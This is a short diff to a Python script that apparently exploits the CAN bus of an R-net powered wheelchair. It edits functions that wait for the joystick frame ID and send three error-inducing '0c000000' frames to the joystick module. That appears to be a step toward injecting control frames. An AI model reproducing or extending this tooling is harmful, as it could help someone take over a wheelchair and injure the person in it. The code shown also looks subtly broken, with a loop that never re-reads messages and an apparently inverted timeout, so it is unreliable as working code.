@@ -339,13 +339,13 @@ def wait_joystickframe(cansocket,t):
     frameid = ''
     msg = cansocket.recv()
 
-    while msg.arbitration_id != 33554432:  #just look for joystick frame ID (no extended frame)
+    while int(msg.arbitration_id,16) != 33554432:  #just look for joystick frame ID (no extended frame)
         #id is always != 02, need to read correctly!
         if t>time():
              joy_id = "33554432"
              print("JoyFrame wait timed out ")
              return(joy_id)
-    return(msg.arbitration_id)
+    return(int(msg.arbitration_id,16))
 
 def induce_JSM_error(cansocket):
     for i in range(0,3):
@@ -358,7 +358,7 @@ def RNET_JSMerror_exploit(cansocket):
         print("Waiting for joy frame")
         joy_id = wait_joystickframe(cansocket,t)   #need to be rewritten using CAN lib
         #joy_id = "02000100" #may work only for exact wheelchair
-        print("Using joy frame: "+joy_id)
+        print("Using joy frame: "+str(joy_id))
         induce_JSM_error(cansocket)
         print("3 x 0c000000# sent")
         return(joy_id)
